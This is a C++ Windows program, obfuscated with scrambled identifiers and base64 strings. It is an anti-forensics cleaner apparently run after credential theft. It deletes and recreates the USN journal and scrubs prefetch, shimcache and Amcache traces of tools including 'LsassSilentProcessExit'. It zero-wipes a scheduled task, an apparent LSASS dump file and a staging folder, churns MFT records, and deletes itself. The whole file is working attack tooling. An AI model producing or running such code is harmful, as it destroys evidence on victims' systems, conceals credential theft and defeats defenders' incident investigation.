#include "base64.h"

#include <fstream>
#include <Windows.h>
#include <iostream>
#include <vector>
#include <algorithm>
#define QFGXKWZU "c2NodGFza3MgL2RlbGV0ZSAvdG4gIg=="
#define XHQWAMZT "QzpcXHRlbXBvZGVtcG8="
#define YJZBDKOX "bWluZEZsdXNo"
#define UDFMCZRP "IiAvZg=="
#define SRQJTYUX "Lg=="
#define YHQFBUVW "Li4="
#define YVNWDFMO "XFw="
#define FMYQJTFP "XFwq"
#define VNJOPKXG 4096
#define YTZFQRWE 0
#define TEMPOTXT "QzpcXHRlbXBvZGVtcG9cXHRlbXBvLnR4dA=="
// Prefetch dir, shimcache reg, amcache hive
#define ZXKQNPMV "C:\\Windows\\Prefetch\\"
#define RQPNKXZM "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache"
#define WXQNPKZR "AppCompatCache"
#define VQXKPNMW "C:\\Windows\\AppCompat\\Programs\\Amcache.hve"
#define NKQWXPMR "TempAmc_CR"
#define PXQNKWMZ "Root\\InventoryApplicationFile"
#define KMQNXPZW "LowerCaseLongPath"
// Binary names — uppercase for prefetch pattern, wide for shimcache path search
#define KQNXWPMZ "BUSINESSANALYZER"
#define XQWNKPMZ "LSASSSILENTPROCESSEXIT"
#define WQNXKPZM "CLEANERUP"
#define QXPKNWMZ L"BusinessAnalyzer"
#define WXNPKMZQ L"LsassSilentProcessExit"
#define NPKQWXZM L"Cleanerup"
#define SHIMCACHE_MAGIC 0x73743031


void RPNVQTUX(const std::string& ZQOPGMDC) {
    HANDLE hFile = CreateFileA(
        ZQOPGMDC.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
        FILE_FLAG_WRITE_THROUGH | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) { CloseHandle(hFile); return; }

    std::vector<char> zeros(VNJOPKXG, 0);
    DWORD bytesWritten;
    for (LONGLONG offset = 0; offset < fileSize.QuadPart; offset += VNJOPKXG) {
        DWORD toWrite = (DWORD)min((LONGLONG)VNJOPKXG, fileSize.QuadPart - offset);
        if (!WriteFile(hFile, zeros.data(), toWrite, &bytesWritten, NULL)) {
            CloseHandle(hFile); return;
        }
        FlushFileBuffers(hFile);
    }
    FlushFileBuffers(hFile);
    CloseHandle(hFile);
    DeleteFileA(ZQOPGMDC.c_str());
}


void RFLNWTJH(std::string GPBVOYZW) {
    WIN32_FIND_DATAA SYWVXNUR;
    std::string GQBXMRPK = GPBVOYZW + base64_decode(FMYQJTFP);
    HANDLE ZKLNVDWV = FindFirstFileA(GQBXMRPK.c_str(), &SYWVXNUR);
    if (ZKLNVDWV == INVALID_HANDLE_VALUE) { FindClose(ZKLNVDWV); return; }
    do {
        std::string IYHRNGOK = SYWVXNUR.cFileName;
        if (IYHRNGOK == base64_decode(SRQJTYUX) || IYHRNGOK == base64_decode(YHQFBUVW)) continue;
        std::string FYMQZXVS = GPBVOYZW + base64_decode(YVNWDFMO) + IYHRNGOK;
        if (SYWVXNUR.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) RFLNWTJH(FYMQZXVS);
        else RPNVQTUX(FYMQZXVS);
    } while (FindNextFileA(ZKLNVDWV, &SYWVXNUR) != YTZFQRWE);
    FindClose(ZKLNVDWV);
    RemoveDirectoryA(GPBVOYZW.c_str());
}


// Delete and recreate USN journal to clear file operation history
void QNXPWKZM() {
    HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hVol == INVALID_HANDLE_VALUE) return;

    // Query current journal ID (required for delete)
    USN_JOURNAL_DATA_V0 ujd = {};
    DWORD br;
    if (!DeviceIoControl(hVol, FSCTL_QUERY_USN_JOURNAL, NULL, 0, &ujd, sizeof(ujd), &br, NULL)) {
        CloseHandle(hVol); return;
    }

    DELETE_USN_JOURNAL_DATA dujd = {};
    dujd.UsnJournalID = ujd.UsnJournalID;
    dujd.DeleteFlags = USN_DELETE_FLAG_DELETE | USN_DELETE_FLAG_NOTIFY;
    DeviceIoControl(hVol, FSCTL_DELETE_USN_JOURNAL, &dujd, sizeof(dujd), NULL, 0, &br, NULL);

    // Recreate with same parameters to avoid suspicious absence
    CREATE_USN_JOURNAL_DATA cujd = { ujd.MaximumSize, ujd.AllocationDelta };
    DeviceIoControl(hVol, FSCTL_CREATE_USN_JOURNAL, &cujd, sizeof(cujd), NULL, 0, &br, NULL);

    CloseHandle(hVol);
}


// Displace freed MFT records by creating temp files that force NTFS to reuse them
void WQKPXNMZ() {
    char path[MAX_PATH];
    std::vector<std::string> files;
    DWORD tick = GetTickCount();

    for (int i = 0; i < 100; i++) {
        snprintf(path, MAX_PATH, "C:\\Windows\\Temp\\~%08X%04X.tmp", tick, i);
        HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); files.push_back(path); }
    }
    for (const auto& f : files) DeleteFileA(f.c_str());
}


// Delete prefetch .pf files for each binary name (uppercase pattern match)
void ZKQWPMVX(const char* names[], int count) {
    std::string dir = ZXKQNPMV;
    for (int i = 0; i < count; i++) {
        std::string pattern = dir + names[i] + "*.pf";
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do { RPNVQTUX(dir + fd.cFileName); } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
}


// Remove entries from AppCompatCache (shimcache) — Windows 10/11 binary format
void MNQXPWZR(const wchar_t* names[], int count) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, RQPNKXZM, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return;

    DWORD dataSize = 0;
    RegQueryValueExA(hKey, WXQNPKZR, NULL, NULL, NULL, &dataSize);
    if (dataSize < 128) { RegCloseKey(hKey); return; }

    std::vector<BYTE> data(dataSize);
    if (RegQueryValueExA(hKey, WXQNPKZR, NULL, NULL, data.data(), &dataSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey); return;
    }

    if (*(DWORD*)data.data() != SHIMCACHE_MAGIC) { RegCloseKey(hKey); return; }

    std::vector<BYTE> newData(data.begin(), data.begin() + 128);
    DWORD newCount = 0;
    size_t offset = 128;

    while (offset + 12 <= (size_t)dataSize) {
        if (*(DWORD*)(data.data() + offset) != SHIMCACHE_MAGIC) break;
        DWORD entryDataSize = *(DWORD*)(data.data() + offset + 8);
        size_t entryEnd = offset + 12 + entryDataSize;
        if (entryEnd > (size_t)dataSize) break;

        bool remove = false;
        if (entryDataSize >= 2) {
            WORD pathLen = *(WORD*)(data.data() + offset + 12);
            if ((DWORD)(2 + pathLen) <= entryDataSize && pathLen > 0) {
                std::wstring path((WCHAR*)(data.data() + offset + 14), pathLen / sizeof(WCHAR));
                std::transform(path.begin(), path.end(), path.begin(), ::towupper);
                for (int i = 0; i < count; i++) {
                    std::wstring name(names[i]);
                    std::transform(name.begin(), name.end(), name.begin(), ::towupper);
                    if (path.find(name) != std::wstring::npos) { remove = true; break; }
                }
            }
        }

        if (!remove) {
            newData.insert(newData.end(), data.begin() + offset, data.begin() + entryEnd);
            newCount++;
        }
        offset = entryEnd;
    }

    *(DWORD*)(newData.data() + 4) = newCount;
    RegSetValueExA(hKey, WXQNPKZR, 0, REG_BINARY, newData.data(), (DWORD)newData.size());
    RegCloseKey(hKey);
}


static void YQXWZPNK(LPCSTR name) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return;
    TOKEN_PRIVILEGES tp = { 1 };
    LookupPrivilegeValueA(NULL, name, &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(hToken);
}


// Remove entries from Amcache.hve matching any of the given binary names
void TXKPVWZQ(const char* names[], int count) {
    YQXWZPNK(SE_RESTORE_NAME);
    YQXWZPNK(SE_BACKUP_NAME);

    if (RegLoadKeyA(HKEY_LOCAL_MACHINE, NKQWXPMR, VQXKPNMW) != ERROR_SUCCESS) return;

    std::string rootPath = std::string(NKQWXPMR) + "\\" + PXQNKWMZ;
    HKEY hRoot;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, rootPath.c_str(), 0, KEY_ALL_ACCESS, &hRoot) == ERROR_SUCCESS) {
        std::vector<std::string> toDelete;
        char subkey[256];
        DWORD idx = 0, len;
        while (len = sizeof(subkey), RegEnumKeyExA(hRoot, idx++, subkey, &len, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            HKEY hEntry;
            if (RegOpenKeyExA(hRoot, subkey, 0, KEY_READ, &hEntry) != ERROR_SUCCESS) continue;
            char val[MAX_PATH * 2]; DWORD valSize = sizeof(val);
            if (RegQueryValueExA(hEntry, KMQNXPZW, NULL, NULL, (BYTE*)val, &valSize) == ERROR_SUCCESS) {
                std::string path(val);
                std::transform(path.begin(), path.end(), path.begin(), ::toupper);
                for (int i = 0; i < count; i++) {
                    std::string upper(names[i]);
                    std::transform(upper.begin(), upper.end(), upper.begin(), ::toupper);
                    if (path.find(upper) != std::string::npos) { toDelete.push_back(subkey); break; }
                }
            }
            RegCloseKey(hEntry);
        }
        for (const auto& k : toDelete) RegDeleteTreeA(hRoot, k.c_str());
        RegCloseKey(hRoot);
    }

    RegUnLoadKey(HKEY_LOCAL_MACHINE, NKQWXPMR);
}


int main() {
    // Clear USN journal (file operation history)
    QNXPWKZM();

    // Clean prefetch, shimcache, amcache for all deployed binaries including self
    const char* prefetchNames[] = { KQNXWPMZ, XQWNKPMZ, WQNXKPZM };
    ZKQWPMVX(prefetchNames, 3);

    const wchar_t* shimNames[] = { QXPKNWMZ, WXNPKMZQ, NPKQWXZM };
    MNQXPWZR(shimNames, 3);

    const char* amcacheNames[] = { "BusinessAnalyzer", "LsassSilentProcessExit", "Cleanerup" };
    TXKPVWZQ(amcacheNames, 3);

    // Wipe scheduled task file before deleting (schtasks /delete only removes, doesn't zero)
    RPNVQTUX("C:\\Windows\\System32\\Tasks\\mindFlush");

    // Delete scheduled task
    std::string schtasksCmd = base64_decode(QFGXKWZU) + base64_decode(YJZBDKOX) + base64_decode(UDFMCZRP);
    STARTUPINFOA si1 = {};
    PROCESS_INFORMATION pi1 = {};
    si1.cb = sizeof(si1);
    if (CreateProcessA(NULL, (LPSTR)schtasksCmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si1, &pi1)) {
        WaitForSingleObject(pi1.hProcess, 5000);
        CloseHandle(pi1.hProcess);
        CloseHandle(pi1.hThread);
    }

    // Wipe dump file (path stored in tempo.txt)
    std::ifstream tempoFile(base64_decode(TEMPOTXT));
    if (tempoFile.is_open()) {
        std::string dumpPath;
        std::getline(tempoFile, dumpPath);
        tempoFile.close();
        dumpPath.erase(dumpPath.find_last_not_of(" \r\n\t") + 1);
        if (!dumpPath.empty())
            RPNVQTUX(dumpPath);
    }

    // Wipe C:\tempodempo
    RFLNWTJH(base64_decode(XHQWAMZT));

    // Displace freed MFT records (must run after deletions)
    WQKPXNMZ();

    // Self-delete
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    char selfDeleteCmd[MAX_PATH + 64];
    snprintf(selfDeleteCmd, sizeof(selfDeleteCmd), "cmd /c choice /d y /t 1 >nul & del /f /q \"%s\"", selfPath);
    STARTUPINFOA si2 = { sizeof(si2) };
    si2.dwFlags = STARTF_USESHOWWINDOW;
    si2.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi2 = {};
    CreateProcessA(NULL, selfDeleteCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si2, &pi2);
    CloseHandle(pi2.hProcess);
    CloseHandle(pi2.hThread);
}
